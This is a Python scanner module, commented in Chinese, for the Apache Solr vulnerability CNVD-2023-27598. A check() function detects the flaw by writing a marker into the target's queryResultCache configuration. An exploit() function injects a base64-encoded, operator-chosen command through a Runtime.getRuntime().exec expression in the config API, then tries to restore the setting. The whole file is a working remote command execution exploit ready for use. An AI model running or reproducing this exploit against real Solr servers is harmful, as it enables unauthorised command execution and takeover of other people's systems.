#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Apache Solr CNVD-2023-27598 漏洞检测模块
Apache Solr 代码执行漏洞
"""

import logging
import json
import random
import string
import base64
import time

def check(scanner, core=None):
    """
    检测CNVD-2023-27598代码执行漏洞
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时检测所有核心
        
    Returns:
        (bool, str): (是否存在漏洞, 详细信息)
    """
    try:
        # 获取Solr信息，检查版本
        info = scanner.get_solr_info()
        if info and scanner.version:
            version = scanner.version
            # 检查版本是否在受影响范围内
            major_version = int(version.split('.')[0])
            minor_version = int(version.split('.')[1])
            
            if (major_version == 8 and minor_version >= 10) or (major_version == 9 and minor_version < 2):
                # 检查是否以SolrCloud模式启动
                resp = scanner.request("GET", "/solr/admin/collections?action=LIST&wt=json")
                
                if resp and resp.status_code == 200 and "collections" in resp.json():
                    # 生成随机标记
                    random_marker = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                    
                    # 构造测试payload
                    test_payload = {
                        "set-property": {
                            "componentName": "queryResultCache",
                            "autoWarmCount": "//VuLnEcHo" + random_marker
                        }
                    }
                    
                    # 获取可用的集合
                    collections = resp.json().get("collections", [])
                    if not collections:
                        return False, "未发现可用的Solr集合，无法测试CNVD-2023-27598漏洞"
                    
                    # 尝试对第一个集合进行测试
                    collection = collections[0]
                    
                    # 发送测试请求
                    resp = scanner.request(
                        "POST", 
                        f"/solr/{collection}/config", 
                        json=test_payload
                    )
                    
                    # 检查响应
                    if resp and resp.status_code == 200:
                        # 检查配置是否成功设置
                        resp = scanner.request(
                            "GET", 
                            f"/solr/{collection}/config/queryResultCache?wt=json"
                        )
                        
                        if resp and resp.status_code == 200:
                            config_data = resp.json()
                            if "autoWarmCount" in config_data and random_marker in config_data["autoWarmCount"]:
                                return True, f"存在CNVD-2023-27598代码执行漏洞，成功修改配置"
                    
                    return False, "未发现CNVD-2023-27598漏洞，无法修改配置"
                else:
                    return False, "Solr未以SolrCloud模式启动，不受CNVD-2023-27598漏洞影响"
            else:
                return False, f"Solr版本{version}不在CNVD-2023-27598漏洞影响范围内"
        else:
            # 无法获取版本信息，直接尝试测试
            resp = scanner.request("GET", "/solr/admin/collections?action=LIST&wt=json")
            
            if resp and resp.status_code == 200 and "collections" in resp.json():
                # 生成随机标记
                random_marker = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                
                # 构造测试payload
                test_payload = {
                    "set-property": {
                        "componentName": "queryResultCache",
                        "autoWarmCount": "//VuLnEcHo" + random_marker
                    }
                }
                
                # 获取可用的集合
                collections = resp.json().get("collections", [])
                if not collections:
                    return False, "未发现可用的Solr集合，无法测试CNVD-2023-27598漏洞"
                
                # 尝试对第一个集合进行测试
                collection = collections[0]
                
                # 发送测试请求
                resp = scanner.request(
                    "POST", 
                    f"/solr/{collection}/config", 
                    json=test_payload
                )
                
                # 检查响应
                if resp and resp.status_code == 200:
                    # 检查配置是否成功设置
                    resp = scanner.request(
                        "GET", 
                        f"/solr/{collection}/config/queryResultCache?wt=json"
                    )
                    
                    if resp and resp.status_code == 200:
                        config_data = resp.json()
                        if "autoWarmCount" in config_data and random_marker in config_data["autoWarmCount"]:
                            return True, f"存在CNVD-2023-27598代码执行漏洞，成功修改配置"
                
                return False, "未发现CNVD-2023-27598漏洞，无法修改配置"
            else:
                return False, "Solr未以SolrCloud模式启动或无法获取集合列表，不受CNVD-2023-27598漏洞影响"
    except Exception as e:
        logging.error(f"检测CNVD-2023-27598异常: {str(e)}")
        return False, f"检测异常: {str(e)}"

def exploit(scanner, command=None):
    """
    利用CNVD-2023-27598漏洞执行命令
    
    Args:
        scanner: SolrScanner实例
        command: 要执行的命令
        
    Returns:
        (bool, str): (是否成功, 结果信息)
    """
    if not command:
        return False, "请提供要执行的命令"
    
    try:
        # 获取可用的集合
        resp = scanner.request("GET", "/solr/admin/collections?action=LIST&wt=json")
        
        if not resp or resp.status_code != 200 or "collections" not in resp.json():
            return False, "无法获取Solr集合列表，请确认Solr以SolrCloud模式启动"
        
        collections = resp.json().get("collections", [])
        if not collections:
            return False, "未发现可用的Solr集合，无法利用CNVD-2023-27598漏洞"
        
        # 使用第一个集合
        collection = collections[0]
        
        # Base64编码命令
        encoded_cmd = base64.b64encode(command.encode()).decode()
        
        # 构造恶意payload
        payload = {
            "set-property": {
                "componentName": "queryResultCache",
                "autoWarmCount": "${Runtime.getRuntime().exec(new String(java.util.Base64.getDecoder().decode('" + encoded_cmd + "')))}"
            }
        }
        
        # 发送利用请求
        resp = scanner.request(
            "POST", 
            f"/solr/{collection}/config", 
            json=payload
        )
        
        # 检查响应
        if resp and resp.status_code == 200:
            # 等待命令执行
            time.sleep(2)
            
            # 尝试恢复配置
            try:
                recovery_payload = {
                    "set-property": {
                        "componentName": "queryResultCache",
                        "autoWarmCount": "0"
                    }
                }
                
                scanner.request(
                    "POST", 
                    f"/solr/{collection}/config", 
                    json=recovery_payload
                )
            except:
                pass
            
            return True, f"命令 '{command}' 已执行，请检查结果"
        else:
            return False, "命令执行失败，可能不存在漏洞或无权限"
    except Exception as e:
        logging.error(f"利用CNVD-2023-27598异常: {str(e)}")
        return False, f"利用异常: {str(e)}"
